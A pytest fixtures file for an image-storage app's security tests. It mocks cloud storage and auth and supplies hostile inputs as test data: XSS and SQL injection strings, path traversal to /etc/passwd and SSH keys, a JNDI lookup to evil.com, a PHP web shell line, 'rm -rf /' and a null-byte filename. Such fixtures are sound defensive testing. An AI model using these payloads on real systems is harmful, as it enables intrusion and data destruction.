"""
Security test configuration and fixtures.

This module provides common fixtures and configuration for security tests,
including mocking of external dependencies like Google Cloud Storage.
"""

import os
import tempfile
from unittest.mock import Mock, patch

import pytest


@pytest.fixture(autouse=True)
def mock_gcs_for_security_tests():
    """Mock Google Cloud Storage for security tests."""
    with patch("google.cloud.storage.Client") as mock_client:
        # Mock the storage client
        mock_bucket = Mock()
        mock_blob = Mock()

        # Mock successful operations
        mock_blob.exists.return_value = False
        mock_blob.upload_from_string.return_value = None
        mock_blob.download_as_bytes.return_value = b"mock_data"
        mock_blob.name = "mock_blob"

        mock_bucket.blob.return_value = mock_blob
        mock_bucket.list_blobs.return_value = []

        mock_client.return_value.bucket.return_value = mock_bucket

        yield mock_client


@pytest.fixture(autouse=True)
def mock_auth_for_security_tests():
    """Mock authentication for security tests."""
    with patch("google.auth.default") as mock_auth:
        mock_credentials = Mock()
        mock_credentials.valid = True
        mock_credentials.token = "mock_token"
        mock_auth.return_value = (mock_credentials, "mock_project")
        yield mock_auth


@pytest.fixture
def test_users():
    """Provide test users for security tests."""
    from tests.e2e.base import MockUser

    return {
        "user1": MockUser("test-user-1", "user1@example.com", "Test User 1"),
        "user2": MockUser("test-user-2", "user2@example.com", "Test User 2"),
        "admin": MockUser("admin-user", "admin@example.com", "Admin User"),
    }


@pytest.fixture
def db_helper():
    """Provide database test helper for security tests."""
    from tests.e2e.base import DatabaseTestHelper

    temp_dir = tempfile.mkdtemp()
    helper = DatabaseTestHelper(temp_dir)
    yield helper
    helper.cleanup()
    import shutil

    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture(autouse=True)
def security_test_environment():
    """Set up environment for security tests."""
    # Set test environment variables
    test_env = {
        "ENVIRONMENT": "test",
        "GOOGLE_CLOUD_PROJECT": "test-project",
        "GCS_PHOTOS_BUCKET": "test-photos-bucket",
        "GCS_DATABASE_BUCKET": "test-database-bucket",
        "DATABASE_URL": "sqlite:///:memory:",
    }

    with patch.dict(os.environ, test_env):
        yield


@pytest.fixture
def temp_database():
    """Create a temporary database for security tests."""
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as temp_file:
        temp_path = temp_file.name

    yield temp_path

    # Cleanup
    try:
        os.unlink(temp_path)
    except OSError:
        pass


@pytest.fixture
def mock_user_info():
    """Create a mock user info for security tests."""
    from src.imgstream.services.auth import UserInfo

    return UserInfo(user_id="test-user-123", email="test@example.com", name="Test User")


@pytest.fixture
def security_test_data():
    """Provide common test data for security tests."""
    return {
        "valid_emails": ["user@example.com", "test.user@domain.co.uk", "user+tag@example.org"],
        "invalid_emails": ["", "not-an-email", "@example.com", "user@", "user@.com", "user space@example.com"],
        "malicious_strings": [
            '<script>alert("xss")</script>',
            '"; DROP TABLE users; --',
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02",
            "\\x3cscript\\x3e",
        ],
        "sql_injection_attempts": [
            "'; DROP TABLE photos; --",
            "' OR '1'='1",
            "'; DELETE FROM users; --",
            "' UNION SELECT * FROM admin; --",
            "admin'--",
            "' OR 1=1 --",
        ],
        "xss_payloads": [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            'javascript:alert("xss")',
            '<svg onload=alert("xss")>',
            '<iframe src=javascript:alert("xss")></iframe>',
            '<body onload=alert("xss")>',
            '<div onclick=alert("xss")>Click me</div>',
        ],
        "path_traversal_attempts": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "../../../../root/.ssh/id_rsa",
            "..\\..\\..\\autoexec.bat",
        ],
    }


@pytest.fixture
def mock_image_data():
    """Create mock image data for security tests."""
    import io

    from PIL import Image

    # Create a small test image
    image = Image.new("RGB", (100, 100), color="red")
    buffer = io.BytesIO()
    image.save(buffer, format="JPEG", quality=95)
    return buffer.getvalue()


@pytest.fixture
def mock_malicious_file_data():
    """Create mock malicious file data for security tests."""
    return {
        "zip_bomb": b"PK\x03\x04" + b"\x00" * 1000,  # Fake ZIP header
        "executable": b"MZ\x90\x00",  # PE executable header
        "script": b"#!/bin/bash\nrm -rf /",
        "html": b'<html><script>alert("xss")</script></html>',
        "php": b'<?php system($_GET["cmd"]); ?>',
        "null_bytes": b"image.jpg\x00.exe",
        "oversized": b"x" * (100 * 1024 * 1024),  # 100MB
    }
